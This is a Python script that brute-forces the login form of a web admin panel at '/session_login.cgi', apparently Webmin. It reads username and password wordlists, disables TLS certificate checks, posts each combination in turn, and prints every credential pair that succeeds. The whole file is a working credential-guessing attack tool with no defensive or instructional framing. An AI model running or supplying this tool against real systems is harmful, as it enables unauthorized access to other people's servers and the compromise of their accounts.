import requests
import argparse
import time
from enum import Enum
from urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


class ResponseType(Enum):
    SUCCESSFUL = 0
    INCORRECT_CREDS = 1
    REQUEST_FAILS = -1


def send_login_request(username: str, password: str, target: str) -> requests.Response:
    url = f'{target}/session_login.cgi'
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': f'{target}/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': target,
        'Upgrade-Insecure-Requests': '1',
        'Connection': 'close'
    }
    data = {
        'user': username,
        'pass': password
    }
    cookies = {
        'redirect': '1',
        'testing': '1'
    }

    response = requests.post(url, headers=headers, data=data, cookies=cookies, verify=False)

    return response


def test_credentials(username: str, password: str, target: str) -> ResponseType:
    response = send_login_request(username, password, target)
    if 'Login failed' in response.text:
        return ResponseType.INCORRECT_CREDS
    if response.status_code != 200:
        return ResponseType.REQUEST_FAILS
    return ResponseType.SUCCESSFUL


def brute_force_attack(usernames: list[str], passwords: list[str], target: str) -> list[tuple[str, str]]:
    potentially_correct_combinations = [(username, password) for username in usernames for password in passwords]
    known_correct_combinations = []
    while len(potentially_correct_combinations) > 0:
        username, password = potentially_correct_combinations.pop(0)
        result = test_credentials(username, password, target)
        if result == ResponseType.SUCCESSFUL:
            print(f"Successful login with username: {username}, password: {password}")
            potentially_correct_combinations = [(u, p) for u, p in potentially_correct_combinations if u != username]
            known_correct_combinations.append((username, password))
        elif result == ResponseType.INCORRECT_CREDS:
            print(f"Incorrect credentials for username: {username}, password: {password}")
        elif result == ResponseType.REQUEST_FAILS:
            print(f"Request failed for username: {username}, password: {password}. Retrying...")
            potentially_correct_combinations.append((username, password))
        if len(potentially_correct_combinations) > 0:
            time.sleep(5)
    return known_correct_combinations


def main():
    parser = argparse.ArgumentParser(description="Bruteforce login using a wordlist")
    parser.add_argument("-u", "--username", help="Single username")
    parser.add_argument("-U", "--username-list", help="Path to a file containing a list of usernames")
    parser.add_argument("-p", "--password", help="Single password")
    parser.add_argument("-P", "--password-list", help="Path to a file containing a list of passwords")
    parser.add_argument(help="Target URL", type=str, dest='target')
    args = parser.parse_args()

    if (args.username and args.username_list) or not (args.username or args.username_list):
        print("Please provide either a single username or a list of usernames")
        return
    if (args.password and args.password_list) or not (args.password or args.password_list):
        print("Please provide either a single password or a list of passwords")
        return
    if args.username:
        usernames = [args.username]
    elif args.username_list:
        with open(args.username_list, 'r') as f:
            usernames = [x.removesuffix('\n') for x in f.readlines()]
    if args.password:
        passwords = [args.password]
    elif args.password_list:
        with open(args.password_list, 'r') as f:
            passwords = [x.removesuffix('\n') for x in f.readlines()]

    brute_force_attack(usernames, passwords, args.target)


if __name__ == "__main__":
    main()
